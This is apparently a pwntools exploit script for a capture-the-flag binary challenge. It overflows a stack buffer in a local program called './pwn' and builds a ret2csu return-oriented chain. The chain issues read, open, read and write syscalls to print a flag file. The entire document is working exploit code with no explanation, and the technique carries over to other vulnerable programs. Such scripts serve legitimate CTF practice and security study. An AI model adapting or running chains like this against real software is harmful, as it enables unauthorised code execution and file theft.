from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process(["./ld-2.27.so","./pwn"], env = {"LD_PRELOAD":"./libc-2.27.so"})
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b''

bss = elf.bss() + 0x200
main = 0x40078D
rdi = 0x0000000000400813 # pop rdi ; ret
rsi = 0x0000000000400811 # pop rsi ; pop r15 ; ret
syscall = 0x600FE8
front = 0x4007F0
end = 0x40080A

def csu(rax, rdi, rsi, func, ret):
	pay  = p64(0) + p64(1)
	pay += p64(func) + p64(rax) + p64(rdi) + p64(rsi) + p64(front)
	pay += p64(0)*7 + p64(ret)
	return pay	

pay  = b'A'*0x30 + p64(0xdeadbeef) + p64(end) + csu(0, 0, bss, syscall, end)
pay += csu(2, bss, 0, syscall, end)
pay += csu(0, 3, bss+0x100, syscall, end)
pay += csu(1, 1, bss+0x100, syscall, end)
 
sla(b'2023!', pay)
debug()
sl(b'./flag\x00\x00')
sh()
